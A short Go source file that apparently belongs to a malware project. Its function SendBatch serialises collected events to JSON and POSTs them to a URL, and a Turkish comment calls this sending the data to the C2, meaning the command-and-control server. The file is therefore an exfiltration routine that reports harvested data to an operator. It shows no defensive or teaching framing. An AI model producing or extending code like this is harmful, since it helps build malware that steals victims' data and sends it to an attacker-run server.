package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

func SendBatch(events []Event, url string) error {
	if len(events) == 0 {
		return nil
	}

	data, err := json.Marshal(events)
	if err != nil {
		return err
	}

	client := &http.Client{Timeout: 5 * time.Second}

	//Veriyi C2 ye post et
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("server error, status code: %d", resp.StatusCode)
	}

	return nil
}
